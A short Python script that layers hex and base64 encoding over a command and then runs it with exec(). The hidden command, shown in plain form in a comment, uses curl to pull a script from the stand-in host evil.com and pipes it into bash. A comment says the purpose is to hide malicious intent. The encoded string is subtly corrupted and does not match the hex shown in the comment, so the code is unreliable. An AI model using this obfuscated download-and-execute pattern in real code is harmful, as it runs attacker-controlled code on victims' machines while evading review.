import base64

# Stage 0: raw payload
# import os; os.system('curl -s http://evil.com/x | bash')

# Stage 1: hex encoding
# 696d706f7274206f733b206f732e73797374656d28276375726c202d7320687474703a2f2f6576696c2e636f6d2f78207c20626173682729

# Stage 2: base64 of hex
payload = "Njk2ZDcwNmY3MjcwMjA2ZjczM2IyMDZmNzMyZTczNzk3Mzc0NjU2ZDI4Mjc2MzczNzI2YzIwMmQ3MzIwNjg3NDc0NzAzYTImMmY2NTc2Njk2YzJlNjM2ZjZkMmY3ODIwN2MyMDYyNjE3MzY4MjcyOQ=="

def execute():
    # Attempting to hide malicious intent via nested decoding
    s1 = base64.b64decode(payload).decode('utf-8')
    s2 = bytes.fromhex(s1).decode('utf-8')
    exec(s2)

if __name__ == "__main__":
    execute()
